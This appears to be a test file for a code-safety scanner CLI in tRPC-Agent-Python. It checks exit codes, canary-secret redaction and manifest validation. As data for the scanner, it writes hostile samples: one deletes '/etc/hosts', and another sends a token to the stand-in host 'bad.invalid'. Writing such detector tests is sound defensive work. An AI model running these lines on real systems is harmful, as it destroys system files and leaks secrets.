# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""In-process CLI tests; supplied sample source is never executed."""

from __future__ import annotations

import io
import json
from pathlib import Path

import yaml

from trpc_agent_sdk.safety._cli import EXIT_ALLOW
from trpc_agent_sdk.safety._cli import EXIT_DENY
from trpc_agent_sdk.safety._cli import EXIT_INVALID_INPUT
from trpc_agent_sdk.safety._cli import EXIT_MANIFEST_MISMATCH
from trpc_agent_sdk.safety._cli import EXIT_REVIEW
from trpc_agent_sdk.safety._cli import main

from .conftest import CANARY

ROOT = Path(__file__).resolve().parents[2]
POLICY = ROOT / "examples/tool_safety/tool_safety_policy.yaml"
MANIFEST = ROOT / "examples/tool_safety/sample_manifest.yaml"


def test_file_json_allow_and_deny_exit_codes(tmp_path: Path, capsys):
    safe = tmp_path / "safe.py"
    dangerous = tmp_path / "dangerous.py"
    safe.write_text("print('ok')", encoding="utf-8")
    dangerous.write_text("import os\nos.remove('/etc/hosts')", encoding="utf-8")
    assert main([str(safe), "--policy", str(POLICY), "--json"]) == EXIT_ALLOW
    payload = json.loads(capsys.readouterr().out)
    assert payload["decision"] == "allow"
    assert main([str(dangerous), "--policy", str(POLICY), "--json"]) == EXIT_DENY
    payload = json.loads(capsys.readouterr().out)
    assert payload["execution_blocked"] is True


def test_stdin_review_exit_code(monkeypatch, capsys):
    monkeypatch.setattr("sys.stdin", io.StringIO("import requests\nrequests.get(target)"))
    assert main(["--stdin", "--language", "python", "--json"]) == EXIT_REVIEW
    assert json.loads(capsys.readouterr().out)["decision"] == "needs_human_review"


def test_audit_path_contains_redacted_event(tmp_path: Path, capsys):
    source = tmp_path / "dangerous.py"
    audit = tmp_path / "audit.jsonl"
    source.write_text(f"import requests\nrequests.get('https://bad.invalid?token={CANARY}')", encoding="utf-8")
    assert main([str(source), "--audit", str(audit), "--json"]) == EXIT_DENY
    output = capsys.readouterr()
    assert CANARY not in output.out
    assert CANARY not in output.err
    assert CANARY not in audit.read_text(encoding="utf-8")


def test_manifest_validation_passes_all_public_samples(capsys):
    assert main(["--manifest", str(MANIFEST), "--policy", str(POLICY), "--json"]) == EXIT_ALLOW
    payload = json.loads(capsys.readouterr().out)
    assert payload["matched"] is True
    assert len(payload["results"]) == 12
    assert all(item["matched"] for item in payload["results"])


def test_manifest_mismatch_has_dedicated_exit_code(tmp_path: Path, capsys):
    sample = tmp_path / "safe.py"
    sample.write_text("print('ok')", encoding="utf-8")
    manifest = tmp_path / "manifest.yaml"
    manifest.write_text(
        yaml.safe_dump({
            "schema_version":
            "1",
            "samples": [{
                "name": "mismatch",
                "file": "safe.py",
                "language": "python",
                "expected_decision": "deny",
                "expected_risk": "high",
                "required_rules": ["NOT.PRESENT"],
                "expected_blocked": True,
            }],
        }),
        encoding="utf-8",
    )
    assert main(["--manifest", str(manifest), "--json"]) == EXIT_MANIFEST_MISMATCH
    assert json.loads(capsys.readouterr().out)["matched"] is False


def test_invalid_input_is_generic_and_does_not_echo_canary(tmp_path: Path, capsys):
    missing = tmp_path / f"missing-{CANARY}.py"
    assert main([str(missing), "--json"]) == EXIT_INVALID_INPUT
    output = capsys.readouterr()
    assert CANARY not in output.out
    assert CANARY not in output.err
